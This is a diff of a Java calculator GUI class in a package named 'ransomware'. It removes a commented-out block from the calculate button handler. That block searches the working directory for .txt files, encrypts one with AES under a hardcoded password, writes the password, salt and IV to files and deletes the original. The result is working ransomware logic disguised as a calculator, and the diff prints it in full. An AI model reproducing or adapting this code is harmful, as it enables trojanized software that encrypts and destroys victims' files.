@@ -1,26 +1,8 @@
 
 package ransomware;
 
-import java.io.File;
 import javax.swing.JOptionPane;
 
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
-import java.io.FilenameFilter;
-import java.io.PrintWriter;
-import java.security.AlgorithmParameters;
-import java.security.SecureRandom;
-import java.security.spec.KeySpec;
-import java.util.Scanner;
-import java.util.StringTokenizer;
-
-import javax.crypto.Cipher;
-import javax.crypto.SecretKey;
-import javax.crypto.SecretKeyFactory;
-import javax.crypto.spec.IvParameterSpec;
-import javax.crypto.spec.PBEKeySpec;
-import javax.crypto.spec.SecretKeySpec;
 
 
 public class CalcDispaly extends javax.swing.JFrame {
@@ -569,151 +551,8 @@ public class CalcDispaly extends javax.swing.JFrame {
             
             System.out.println(answerD);
             ansS = Double.toString(answerD);        //convert answer to a string value
-            
-            
-/*            
-            //*****************file encryption part***************************************
-            //****************************************************************************
-            
-            //-----search for the .txt files in the current directory---------
-            String filename = "";                           //variable to store file name with the extension
-            File dir = new File(".");                       //specify the current directory by .
-            
-                //get the list of file names ends with .txt extension
-            FilenameFilter filter = new FilenameFilter() {
-                public boolean accept (File dir, String name) { 
-                    return name.endsWith(".txt");
-                } 
-            }; 
-            String[] children = dir.list(filter);
-                //get the file name from files list
-            if (children == null) {
-                System.out.println("Either dir does not exist or is not a directory"); 
-            } 
-            else {
-                int count = 0 ;
-                while (count < children.length) {
-                    if (!children[count].equals("passwordFile.txt")) {      //to avoid encrypting passwordFile.txt
-                        filename = children[count];                        
-                    }
-                    System.out.println(filename);
-                    count++;
-                } 
-            } 
-            
-            
-            
-                        
-            String fileNameWOExtension = "";                     //variable to store file name without extension
-            
-            //-----get the file name only by eleminating .txt extension-----------
-            StringTokenizer fnameFull = new StringTokenizer(filename, ".");        
-            int tokenCount = 0;
-            while (fnameFull.hasMoreTokens() && fnameFull.countTokens()>1) {
-                if (tokenCount > 0) {               //if file nae has multiple dots
-                    fileNameWOExtension = fileNameWOExtension + "." + fnameFull.nextToken();
-                }
-                else {
-                    fileNameWOExtension = fnameFull.nextToken();
-                }
-                System.out.println(fileNameWOExtension + "  " + tokenCount);
-                tokenCount++;
-            }
                         
             
-            
-            
-            String password = "nimz@123456789";     // password to encrypt the file
-            
-            //-----write decryption pasword to a txt file----------------------------
-            PrintWriter writer = new PrintWriter("passwordFile.txt", "UTF-8");
-            writer.println("Decryption Password=" + password);
-            writer.close();
-            
-            
-            
-            //file to be encrypted
-            FileInputStream inFile = new FileInputStream(filename);  //specify the inputfile name before encryption
-
-            
-            // encrypted file
-            FileOutputStream outFile = new FileOutputStream(fileNameWOExtension + ".des");   //specify the file name after encryption
-
-            
-            // password, iv and salt should be transferred to the other end
-            // in a secure manner
-
-            // salt is used for encoding
-            // writing it to a file
-            // salt should be transferred to the recipient securely
-            // for decryption
-            
-            //-----generate salt value and write salt value to a file------
-            byte[] salt = new byte[8];
-            SecureRandom secureRandom = new SecureRandom();
-            secureRandom.nextBytes(salt); 
-            FileOutputStream saltOutFile = new FileOutputStream("salt.enc");
-            saltOutFile.write(salt);
-            saltOutFile.close();
-
-            //-----generate a key------------------------------------------
-            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
-            KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 65536, 256);
-            SecretKey secretKey = factory.generateSecret(keySpec);
-            SecretKeySpec secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
-            System.out.println(secret.toString());
-
-            //-----encrypt the file with the generated dkey----------------
-            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-            cipher.init(Cipher.ENCRYPT_MODE, secret); 
-            AlgorithmParameters params = cipher.getParameters();
-
-            // iv adds randomness to the text and just makes the mechanism more
-            // secure
-            // used while initializing the cipher
-            // file to store the iv
-            FileOutputStream ivOutFile = new FileOutputStream("iv.enc");
-            byte[] iv = params.getParameterSpec(IvParameterSpec.class).getIV();
-            ivOutFile.write(iv);
-            ivOutFile.close();
-
-            //-----file encryption - write data in input file to an output file---------
-            byte[] input = new byte[64];
-            int bytesRead;
-
-
-            while ((bytesRead = inFile.read(input)) != -1) {
-                    byte[] output = cipher.update(input, 0, bytesRead);
-                    if (output != null)
-                            outFile.write(output);
-            }
-
-            byte[] output = cipher.doFinal();
-            if (output != null)
-                    outFile.write(output);
-
-            inFile.close();
-            outFile.flush();
-            outFile.close();
-
-            System.out.println("File Encrypted.");
-            ecryptionStatus = true;
-            
-
-            //-----delete original file---------------------------------------
-            boolean fdelete = new File(filename).delete();
-
-            if (fdelete) {
-                System.out.println("file deleted");
-            }
-           
-            
-            //**************Encryption done***************************
-*/            
-            //pass the answer to the next form and display the answer form
-//            Answer aform = new Answer(ansS, ecryptionStatus);
-//            aform.setVisible(true);
-//            
             //pass the answer for the next form
             ChooseFolder cf = new ChooseFolder(ansS, ecryptionStatus);
             cf.setVisible(true);
@@ -732,28 +571,13 @@ public class CalcDispaly extends javax.swing.JFrame {
             JOptionPane.showMessageDialog(this, "Fill the text Feilds correctly..!", "Error!", JOptionPane.WARNING_MESSAGE);
             resetFeilds();
         }
-        
-/*        catch(FileNotFoundException e){
-            JOptionPane.showMessageDialog(this, "No files are found to encrypt!", "GREAT!", JOptionPane.INFORMATION_MESSAGE);
-//            resetFeilds();
-
-            //pass the answer to the next form and display the answer form
-            Answer aform = new Answer(ansS, ecryptionStatus);
-            aform.setVisible(true);
-            
-            //show the answer form
-            this.dispose();
-            
-        }
-*/            
+                 
         catch(Exception e){
             JOptionPane.showMessageDialog(this, "Error..!", "Error!", JOptionPane.ERROR_MESSAGE);
             resetFeilds();
         }
             
-        
-//        resetFeilds();
-
+ 
         
     }//GEN-LAST:event_btn_calcActionPerformed
 
